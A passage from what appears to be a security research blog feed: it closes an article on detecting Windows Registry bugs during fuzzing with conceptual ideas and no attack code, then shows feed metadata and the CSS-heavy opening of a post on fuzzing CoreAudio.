id=&quot;h.kyhlsn1j4ou8&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Bug detection&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Alongside a good initial corpus, mutator and harness, the fourth and final pillar of &lt;/span&gt;&lt;span&gt;an &lt;/span&gt;&lt;span&gt;effective fuzzing session is bug detection.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;After all, what good is it to generate an interesting sample and trigger a problem with a series of complicated calls, if we don&amp;#39;t even notice the bug &lt;/span&gt;&lt;span&gt;occurring&lt;/span&gt;&lt;span&gt;?&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In typical user-mode fuzzing, bug detection is assisted by tools such as AddressSanitizer, which are integrated into the build process and add extra instrumentation to the binary to enable the detection of all invalid memory references taking place in the code.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the case of the Windows kernel, a similar role is played by the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/special-pool&quot;&gt;Special Pool&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which isolates individual allocations on kernel pools to maximize the probability of a crash when an out-of-bounds access/use-after-free condition occurs.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, it may also be beneficial to enable the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/low-resources-simulation&quot;&gt;Low Resources Simulation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;mechanism, which can cause some pool allocations to fail and thus potentially help in triggering bugs related to handling OOM conditions.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The challenge with the registry lies in the fact that most bugs don&amp;#39;t stem from memory corruption within the kernel pools.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Typically, we&amp;#39;re dealing with either hive-based memory corruption or its early stage&amp;mdash;an inconsistent state within the registry that violates a crucial invariant.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Reaching memory corruption in such a scenario necessitates additional steps from an attacker.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For instance, consider a situation where the reference count of a security descriptor is decremented without removing a reference to it in a key node.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To trigger a system bugcheck, one would need to remove all other references to that security descriptor (e.g., by deleting keys), overwrite it with different data (e.g., by setting a value), and then perform an operation on it or one of its adjacent descriptors that would lead to a system crash.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Each extra step significantly decreases the likelihood of achieving the desired state.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The fact that cells have their own allocator further hinders fuzzing, as there&amp;#39;s no equivalent of the Special Pool available for it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c10&quot;&gt;&lt;span&gt;Here are a few ideas for addressing the problem, some more realistic than others:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_4dgbyucsgzt8-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;If we had a special library capable of breaking down regf files at various levels of abstraction, we could have the mutator create the input hive in a way that maximizes the chances of a crash if a bug occurs during a cell operation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, we could assign each key a separate security descriptor with refcount=1 (which should make triggering UAFs easier) and place each cell at the end of a separate bin, followed by another, empty bin.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This behavior would be very similar to how the Special Pool works, but at the bin and cell level.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Again, if we had a good regf file parser, we could open the hive saved on disk &lt;/span&gt;&lt;span&gt;after each iteration of the harness and verify its internal consistency&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This would allow us to catch inconsistent hive states early, even if they didn&amp;#39;t lead to memory corruption or a system crash in a specific case.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_4dgbyucsgzt8-1 start&quot;&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c10 c36 li-bullet-0&quot;&gt;&lt;span&gt;Possibly, instead of implementing the hive parsing and verification mechanism from scratch, one could try to reuse an existing implementation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In particular, an interesting idea would be to use the self-healing property of the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Thanks to this, after each iteration, we could theoretically load the hive once again for a short period of time, unload it, and then compare the &amp;quot;before&amp;quot; and &amp;quot;after&amp;quot; representations to see if the loader fixed any parts of the hive &lt;/span&gt;&lt;span&gt;during the loading process&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We could potentially also try to use the user-mode offreg.dll library for this purpose, which seems to share much of the hive loading code with the Windows kernel, and which would likely be &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;more efficient to call.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_4dgbyucsgzt8-0&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;As part of testing a given hive in a harness, we could periodically fill the entire hive (or at least all its existing bins) with random data to increase the probability of detecting UAFs by overwriting freed objects with incorrect data.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Finally, as an optional step, one could consider implementing checks at the harness level to identify logical issues in registry behavior.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, after each individual operation, the harness could verify whether the process security token and handle access rights actually allowed it &amp;ndash; thereby checking if the kernel correctly performed security access checks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Another idea would be to examine whether all operations within a transaction have been applied correctly during the commit phase.&lt;/span&gt;&lt;span&gt;&amp;nbsp;As we can see, t&lt;/span&gt;&lt;span&gt;here are many potential ideas, but when evaluating their potential usefulness, it is important to focus on the registry behaviors and API contracts that are most relevant to system security.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ujDEXfwdRL-c11 ujDEXfwdRL-c28&quot; id=&quot;h.j4g82032u4k8&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c42&quot;&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;This concludes our exploration of the Windows Registry&amp;#39;s role in system security and effective vulnerability discovery techniques. &lt;/span&gt;&lt;span&gt;In the next post, we&lt;/span&gt;&lt;span&gt;&amp;#39;ll&lt;/span&gt;&lt;span&gt;&amp;nbsp;stay on the topic of security, &lt;/span&gt;&lt;span&gt;but we&amp;#39;ll shift &lt;/span&gt;&lt;span&gt;our focus from discovering bugs to developing specific techniques for exploiting them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We&lt;/span&gt;&lt;span&gt;&amp;#39;ll&lt;/span&gt;&lt;span&gt;&amp;nbsp;use case studies of some experimental exploits I wrote during my research to demonstrate their practical security implications.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;See you then!&lt;/span&gt;&lt;/p&gt;

</content><link rel='replies' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/2349998921347799378/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='https://googleprojectzero.blogspot.com/2025/05/the-windows-registry-adventure-7-attack-surface.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/2349998921347799378'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/2349998921347799378'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/2025/05/the-windows-registry-adventure-7-attack-surface.html' title='The Windows Registry Adventure #7: Attack surface analysis'/><author><name>Google Project Zero</name><uri>http://www.blogger.com/profile/08975904405228580347</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTAwmKkYwj-CpSxel2GRyayZAwdHslWPyC9E_p9cSof2B2Z7PI19HYsSU79hQN1unmzNqgUBzb55QPGOvbGfIsLmvOpva1v0GIOb42IW923oTdR_Hx45_9IkrOhz3XdglaGQlS9LrnHC0hbEI_ue-j5-HkxpMPNifT6SMSuoJYmQmQkHBw2zY4L7KsOIw/s72-c/image2.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-4838136820032157985.post-2451342535286924765</id><published>2025-05-09T10:38:00.000-07:00</published><updated>2025-05-09T10:38:36.040-07:00</updated><title type='text'>Breaking the Sound Barrier Part I: Fuzzing CoreAudio with Mach Messages</title><content type='html'>&lt;style type=&quot;text/css&quot;&gt;@import url(https://themes.googleusercontent.com/fonts/css?kit=DFQxm4rd7fRHgM9OTejWVT5Vho6BE7M80rHXEVKqXWcinf93kRmgH2T4xWS0JMLdN4duVc9C58uwPiY8_59Fz_5Jgr8ufe5A6KahQF76Xmg);.lst-kix_ohg79bwzg1vr-6&gt;li{counter-increment:lst-ctn-kix_ohg79bwzg1vr-6}.lst-kix_b44qe3f46l3s-3&gt;li{counter-increment:lst-ctn-kix_b44qe3f46l3s-3}.lst-kix_csck9rydgkh1-7&gt;li{counter-increment:lst-ctn-kix_csck9rydgkh1-7}ol.lst-kix_isqxjnyw1znn-6.start{counter-reset:lst-ctn-kix_isqxjnyw1znn-6 0}.lst-kix_coh4nx83hsps-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_coh4nx83hsps-3&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_csck9rydgkh1-1{list-style-type:none}ol.lst-kix_isqxjnyw1znn-0.start{counter-reset:lst-ctn-kix_isqxjnyw1znn-0 0}ol.lst-kix_csck9rydgkh1-0{list-style-type:none}ol.lst-kix_csck9rydgkh1-3{list-style-type:none}.lst-kix_coh4nx83hsps-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_csck9rydgkh1-2{list-style-type:none}.lst-kix_jlc16l67nmi-4&gt;li{counter-increment:lst-ctn-kix_jlc16l67nmi-4}ol.lst-kix_csck9rydgkh1-5{list-style-type:none}.lst-kix_coh4nx83hsps-2&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_csck9rydgkh1-4{list-style-type:none}ol.lst-kix_csck9rydgkh1-7{list-style-type:none}.lst-kix_csck9rydgkh1-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_csck9rydgkh1-6,decimal) &quot;. &quot;}ol.lst-kix_csck9rydgkh1-6{list-style-type:none}ol.lst-kix_csck9rydgkh1-8{list-style-type:none}.lst-kix_knew7kyztaa4-6&gt;li:before{content:&quot;-  &quot;}ol.lst-kix_csck9rydgkh1-0.start{counter-reset:lst-ctn-kix_csck9rydgkh1-0 0}.lst-kix_csck9rydgkh1-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_csck9rydgkh1-4,lower-latin) &quot;. &quot;}.lst-kix_csck9rydgkh1-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_csck9rydgkh1-5,lower-roman) &quot;. &quot;}.lst-kix_coh4nx83hsps-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_b44qe3f46l3s-5.start{counter-reset:lst-ctn-kix_b44qe3f46l3s-5 0}.lst-kix_knew7kyztaa4-7&gt;li:before{content:&quot;-  &quot;}.lst-kix_isqxjnyw1znn-2&gt;li{counter-increment:lst-ctn-kix_isqxjnyw1znn-2}ol.lst-kix_jlc16l67nmi-4.start{counter-reset:lst-ctn-kix_jlc16l67nmi-4 0}.lst-kix_knew7kyztaa4-5&gt;li:before{content:&quot;-  &quot;}.lst-kix_csck9rydgkh1-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_csck9rydgkh1-7,lower-latin) &quot;. &quot;}.lst-kix_knew7kyztaa4-4&gt;li:before{content:&quot;-  &quot;}.lst-kix_knew7kyztaa4-3&gt;li:before{content:&quot;-  &quot;}.lst-kix_csck9rydgkh1-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_csck9rydgkh1-8,lower-roman) &quot;. &quot;}ol.lst-kix_ohg79bwzg1vr-0.start{counter-reset:lst-ctn-kix_ohg79bwzg1vr-0 0}.lst-kix_knew7kyztaa4-1&gt;li:before{content:&quot;-  &quot;}.lst-kix_knew7kyztaa4-0&gt;li:before{content:&quot;-  &quot;}.lst-kix_knew7kyztaa4-2&gt;li:before{content:&quot;-  &quot;}ol.lst-kix_csck9rydgkh1-6.start{counter-reset:lst-ctn-kix_csck9rydgkh1-6 0}.lst-kix_b44qe3f46l3s-5&gt;li{counter-increment:lst-ctn-kix_b44qe3f46l3s-5}.lst-kix_csck9rydgkh1-5&gt;li{counter-increment:lst-ctn-kix_csck9rydgkh1-5}.lst-kix_qtp122dx6iyw-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_qtp122dx6iyw-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_qtp122dx6iyw-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_jlc16l67nmi-6&gt;li{counter-increment:lst-ctn-kix_jlc16l67nmi-6}ol.lst-kix_b44qe3f46l3s-0.start{counter-reset:lst-ctn-kix_b44qe3f46l3s-0 0}.lst-kix_jlc16l67nmi-0&gt;li{counter-increment:lst-ctn-kix_jlc16l67nmi-0}.lst-kix_qtp122dx6iyw-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_b44qe3f46l3s-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_b44qe3f46l3s-0,decimal) &quot;. &quot;}ol.lst-kix_b44qe3f46l3s-1{list-style-type:none}ol.lst-kix_b44qe3f46l3s-0{list-style-type:none}.lst-kix_qtp122dx6iyw-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_isqxjnyw1znn-1.start{counter-reset:lst-ctn-kix_isqxjnyw1znn-1 0}.lst-kix_b44qe3f46l3s-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_b44qe3f46l3s-1,lower-latin) &quot;. &quot;}.lst-kix_b44qe3f46l3s-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_b44qe3f46l3s-3,decimal) &quot;. &quot;}ol.lst-kix_b44qe3f46l3s-5{list-style-type:none}.lst-kix_qtp122dx6iyw-2&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_b44qe3f46l3s-4{list-style-type:none}ol.lst-kix_b44qe3f46l3s-3{list-style-type:none}.lst-kix_qtp122dx6iyw-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_b44qe3f46l3s-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_b44qe3f46l3s-2,lower-roman) &quot;. &quot;}ol.lst-kix_b44qe3f46l3s-2{list-style-type:none}ol.lst-kix_jlc16l67nmi-3.start{counter-reset:lst-ctn-kix_jlc16l67nmi-3 0}.lst-kix_isqxjnyw1znn-4&gt;li{counter-increment:lst-ctn-kix_isqxjnyw1znn-4}ol.lst-kix_isqxjnyw1znn-7{list-style-type:none}.lst-kix_csck9rydgkh1-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_csck9rydgkh1-2,lower-roman) &quot;. &quot;}.lst-kix_csck9rydgkh1-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_csck9rydgkh1-3,decimal) &quot;. &quot;}ol.lst-kix_isqxjnyw1znn-8{list-style-type:none}.lst-kix_b44qe3f46l3s-7&gt;li{counter-increment:lst-ctn-kix_b44qe3f46l3s-7}.lst-kix_knew7kyztaa4-8&gt;li:before{content:&quot;-  &quot;}ol.lst-kix_isqxjnyw1znn-3{list-style-type:none}.lst-kix_b44qe3f46l3s-1&gt;li{counter-increment:lst-ctn-kix_b44qe3f46l3s-1}ol.lst-kix_isqxjnyw1znn-4{list-style-type:none}ol.lst-kix_isqxjnyw1znn-5{list-style-type:none}ol.lst-kix_b44qe3f46l3s-6.start{counter-reset:lst-ctn-kix_b44qe3f46l3s-6 0}ol.lst-kix_csck9rydgkh1-1.start{counter-reset:lst-ctn-kix_csck9rydgkh1-1 0}ol.lst-kix_isqxjnyw1znn-6{list-style-type:none}ul.lst-kix_knew7kyztaa4-2{list-style-type:none}ol.lst-kix_isqxjnyw1znn-0{list-style-type:none}ul.lst-kix_knew7kyztaa4-1{list-style-type:none}ol.lst-kix_isqxjnyw1znn-1{list-style-type:none}ul.lst-kix_knew7kyztaa4-0{list-style-type:none}ol.lst-kix_isqxjnyw1znn-2{list-style-type:none}ul.lst-kix_knew7kyztaa4-6{list-style-type:none}.lst-kix_csck9rydgkh1-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_csck9rydgkh1-0,decimal) &quot;. &quot;}.lst-kix_csck9rydgkh1-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_csck9rydgkh1-1,lower-latin) &quot;. &quot;}ul.lst-kix_knew7kyztaa4-5{list-style-type:none}ul.lst-kix_knew7kyztaa4-4{list-style-type:none}ul.lst-kix_knew7kyztaa4-3{list-style-type:none}.lst-kix_cmt5lo7st1fx-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_knew7kyztaa4-8{list-style-type:none}.lst-kix_cmt5lo7st1fx-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_cmt5lo7st1fx-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_b44qe3f46l3s-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_b44qe3f46l3s-5,lower-roman) &quot;. &quot;}.lst-kix_b44qe3f46l3s-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_b44qe3f46l3s-7,lower-latin) &quot;. &quot;}ul.lst-kix_knew7kyztaa4-7{list-style-type:none}.lst-kix_ohg79bwzg1vr-8&gt;li{counter-increment:lst-ctn-kix_ohg79bwzg1vr-8}.lst-kix_b44qe3f46l3s-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_b44qe3f46l3s-8,lower-roman) &quot;. &quot;}ol.lst-kix_isqxjnyw1znn-7.start{counter-reset:lst-ctn-kix_isqxjnyw1znn-7 0}.lst-kix_b44qe3f46l3s-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_b44qe3f46l3s-4,lower-latin) &quot;. &quot;}.lst-kix_ohg79bwzg1vr-2&gt;li{counter-increment:lst-ctn-kix_ohg79bwzg1vr-2}.lst-kix_cmt5lo7st1fx-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_b44qe3f46l3s-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_b44qe3f46l3s-6,decimal) &quot;. &quot;}.lst-kix_ohg79bwzg1vr-0&gt;li{counter-increment:lst-ctn-kix_ohg79bwzg1vr-0}.lst-kix_csck9rydgkh1-1&gt;li{counter-increment:lst-ctn-kix_csck9rydgkh1-1}.lst-kix_4biuj26gsfpv-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_jlc16l67nmi-8{list-style-type:none}ol.lst-kix_jlc16l67nmi-5{list-style-type:none}ol.lst-kix_jlc16l67nmi-4{list-style-type:none}.lst-kix_cmt5lo7st1fx-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_jlc16l67nmi-7{list-style-type:none}ol.lst-kix_ohg79bwzg1vr-7.start{counter-reset:lst-ctn-kix_ohg79bwzg1vr-7 0}ol.lst-kix_jlc16l67nmi-6{list-style-type:none}ol.lst-kix_jlc16l67nmi-1{list-style-type:none}ol.lst-kix_jlc16l67nmi-0{list-style-type:none}ol.lst-kix_jlc16l67nmi-3{list-style-type:none}ol.lst-kix_jlc16l67nmi-2{list-style-type:none}.lst-kix_4biuj26gsfpv-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_4biuj26gsfpv-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_isqxjnyw1znn-7&gt;li{counter-increment:lst-ctn-kix_isqxjnyw1znn-7}.lst-kix_cmt5lo7st1fx-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_ohg79bwzg1vr-4.start{counter-reset:lst-ctn-kix_ohg79bwzg1vr-4 0}.lst-kix_isqxjnyw1znn-5&gt;li{counter-increment:lst-ctn-kix_isqxjnyw1znn-5}ol.lst-kix_isqxjnyw1znn-2.start{counter-reset:lst-ctn-kix_isqxjnyw1znn-2 0}.lst-kix_csck9rydgkh1-0&gt;li{counter-increment:lst-ctn-kix_csck9rydgkh1-0}.lst-kix_eo6kkvwc0cs-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_eo6kkvwc0cs-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ohg79bwzg1vr-1&gt;li{counter-increment:lst-ctn-kix_ohg79bwzg1vr-1}.lst-kix_eo6kkvwc0cs-2&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_b44qe3f46l3s-8{list-style-type:none}ol.lst-kix_b44qe3f46l3s-7{list-style-type:none}ol.lst-kix_b44qe3f46l3s-6{list-style-type:none}.lst-kix_eo6kkvwc0cs-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_eo6kkvwc0cs-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_4biuj26gsfpv-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_eo6kkvwc0cs-8{list-style-type:none}ul.lst-kix_eo6kkvwc0cs-7{list-style-type:none}ul.lst-kix_eo6kkvwc0cs-6{list-style-type:none}ul.lst-kix_eo6kkvwc0cs-5{list-style-type:none}.lst-kix_4biuj26gsfpv-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_eo6kkvwc0cs-4{list-style-type:none}ul.lst-kix_eo6kkvwc0cs-3{list-style-type:none}ul.lst-kix_eo6kkvwc0cs-2{list-style-type:none}ul.lst-kix_eo6kkvwc0cs-1{list-style-type:none}ul.lst-kix_eo6kkvwc0cs-0{list-style-type:none}.lst-kix_b44qe3f46l3s-0&gt;li{counter-increment:lst-ctn-kix_b44qe3f46l3s-0}.lst-kix_qtp122dx6iyw-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_cmt5lo7st1fx-0{list-style-type:none}ul.lst-kix_cmt5lo7st1fx-1{list-style-type:none}ul.lst-kix_cmt5lo7st1fx-2{list-style-type:none}ul.lst-kix_cmt5lo7st1fx-3{list-style-type:none}ul.lst-kix_cmt5lo7st1fx-4{list-style-type:none}ul.lst-kix_cmt5lo7st1fx-5{list-style-type:none}.lst-kix_b44qe3f46l3s-6&gt;li{counter-increment:lst-ctn-kix_b44qe3f46l3s-6}ul.lst-kix_cmt5lo7st1fx-6{list-style-type:none}ul.lst-kix_cmt5lo7st1fx-7{list-style-type:none}ol.lst-kix_jlc16l67nmi-0.start{counter-reset:lst-ctn-kix_jlc16l67nmi-0 0}ol.lst-kix_ohg79bwzg1vr-6.start{counter-reset:lst-ctn-kix_ohg79bwzg1vr-6 0}ol.lst-kix_isqxjnyw1znn-5.start{counter-reset:lst-ctn-kix_isqxjnyw1znn-5 0}.lst-kix_jlc16l67nmi-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jlc16l67nmi-7,lower-latin) &quot;. &quot;}.lst-kix_66v3bj6n178-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_jlc16l67nmi-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jlc16l67nmi-1,lower-latin) &quot;. &quot;}.lst-kix_9qoa5amsz4qz-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_jlc16l67nmi-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jlc16l67nmi-3,decimal) &quot;. &quot;}.lst-kix_66v3bj6n178-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_jlc16l67nmi-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jlc16l67nmi-5,lower-roman) &quot;. &quot;}.lst-kix_66v3bj6n178-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_isqxjnyw1znn-0&gt;li{counter-increment:lst-ctn-kix_isqxjnyw1znn-0}.lst-kix_9qoa5amsz4qz-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_coh4nx83hsps-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_66v3bj6n178-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_jlc16l67nmi-5&gt;li{counter-increment:lst-ctn-kix_jlc16l67nmi-5}.lst-kix_coh4nx83hsps-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_isqxjnyw1znn-4.start{counter-reset:lst-ctn-kix_isqxjnyw1znn-4 0}.lst-kix_isqxjnyw1znn-6&gt;li{counter-increment:lst-ctn-kix_isqxjnyw1znn-6}ol.lst-kix_ohg79bwzg1vr-5.start{counter-reset:lst-ctn-kix_ohg79bwzg1vr-5 0}.lst-kix_9qoa5amsz4qz-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_9qoa5amsz4qz-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_66v3bj6n178-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ohg79bwzg1vr-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ohg79bwzg1vr-1,lower-latin) &quot;. &quot;}ul.lst-kix_66v3bj6n178-6{list-style-type:none}ul.lst-kix_66v3bj6n178-7{list-style-type:none}.lst-kix_jlc16l67nmi-3&gt;li{counter-increment:lst-ctn-kix_jlc16l67nmi-3}ol.lst-kix_isqxjnyw1znn-3.start{counter-reset:lst-ctn-kix_isqxjnyw1znn-3 0}.lst-kix_ohg79bwzg1vr-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ohg79bwzg1vr-0,decimal) &quot;. &quot;}.lst-kix_ohg79bwzg1vr-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ohg79bwzg1vr-2,lower-roman) &quot;. &quot;}ul.lst-kix_66v3bj6n178-4{list-style-type:none}ul.lst-kix_66v3bj6n178-5{list-style-type:none}ul.lst-kix_66v3bj6n178-8{list-style-type:none}.lst-kix_ohg79bwzg1vr-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ohg79bwzg1vr-5,lower-roman) &quot;. &quot;}ul.lst-kix_coh4nx83hsps-6{list-style-type:none}ol.lst-kix_b44qe3f46l3s-2.start{counter-reset:lst-ctn-kix_b44qe3f46l3s-2 0}ul.lst-kix_coh4nx83hsps-7{list-style-type:none}.lst-kix_ohg79bwzg1vr-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ohg79bwzg1vr-6,decimal) &quot;. &quot;}ul.lst-kix_coh4nx83hsps-8{list-style-type:none}.lst-kix_ohg79bwzg1vr-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ohg79bwzg1vr-7,lower-latin) &quot;. &quot;}.lst-kix_9qoa5amsz4qz-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_coh4nx83hsps-0{list-style-type:none}ul.lst-kix_coh4nx83hsps-1{list-style-type:none}.lst-kix_9qoa5amsz4qz-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_coh4nx83hsps-2{list-style-type:none}ul.lst-kix_coh4nx83hsps-3{list-style-type:none}ul.lst-kix_coh4nx83hsps-4{list-style-type:none}ul.lst-kix_coh4nx83hsps-5{list-style-type:none}.lst-kix_csck9rydgkh1-6&gt;li{counter-increment:lst-ctn-kix_csck9rydgkh1-6}.lst-kix_isqxjnyw1znn-1&gt;li{counter-increment:lst-ctn-kix_isqxjnyw1znn-1}.lst-kix_ohg79bwzg1vr-7&gt;li{counter-increment:lst-ctn-kix_ohg79bwzg1vr-7}.lst-kix_ohg79bwzg1vr-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ohg79bwzg1vr-4,lower-latin) &quot;. &quot;}.lst-kix_ohg79bwzg1vr-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ohg79bwzg1vr-3,decimal) &quot;. 